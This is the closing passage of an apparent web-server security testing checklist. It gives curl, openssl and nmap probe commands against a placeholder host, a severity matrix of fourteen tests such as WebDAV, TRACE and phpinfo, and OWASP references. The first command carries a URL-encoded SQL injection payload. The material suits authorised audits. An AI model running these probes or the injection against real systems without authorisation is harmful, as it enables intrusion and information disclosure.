curl -s https://target.tld/\?p=1%27%20OR%20%271%27%3D%271 | head -10

# HTTP/2 support
curl -sI --http2 https://target.tld/ | head -3

# TLS compression (CRIME)
echo | openssl s_client -connect target.tld:443 2>/dev/null | grep compression

# WebDAV
curl -sI -X PROPFIND -H "Depth: 0" https://target.tld/

# Brotli encoding
curl -sI -H "Accept-Encoding: br" https://target.tld/ | grep -i "content-encoding"

# Nmap full sweep
nmap -sV --script http-methods,http-webdav-scan,http-waf-detect,ssl-enum-ciphers -p 443 target.tld
```

---

## Summary Severity Matrix

| # | Test | Worst Severity | Exploit Type |
|---|---|---|---|
| 1 | Web Server Detection | Info (recon) | Reconnaissance |
| 2 | Directory Listing | **High** | Information disclosure |
| 3 | HTTP Methods | **Critical** (PUT/DELETE) | File upload / deletion |
| 4 | PHP Detection | **Critical** (phpinfo) | Full disclosure |
| 5 | Server Header Version | Medium | Version-based CVE targeting |
| 6 | disable_functions | **Critical** (if leaked) | RCE path |
| 7 | open_basedir | High | Path restriction bypass |
| 8 | ModSecurity | Low–High | WAF bypass / absence |
| 9 | Timing Inference | Info | Fingerprinting |
| 10 | HTTP/2 Detection | Low–Medium | Protocol downgrade/smuggling |
| 11 | Compression Leakage | Low–**High** (CRIME) | Side-channel |
| 12 | SSI (Server Includes) | **Critical** (if exec) | RCE |
| 13 | TRACE (XST) | Medium | Cookie theft |
| 14 | WebDAV | **Critical** | Full file system access |

---

## References

- [OWASP Testing Guide, Server Configuration](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP HTTP Methods Test](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)
- [ModSecurity Reference Manual](https://github.com/SpiderLabs/ModSecurity/wiki)
- [WordPress Hardening](https://wordpress.org/documentation/article/hardening-wordpress/)
- [Mozilla Observatory](https://observatory.mozilla.org/)
- [Nmap NSE Scripts Reference](https://nmap.org/nsedoc/scripts/)
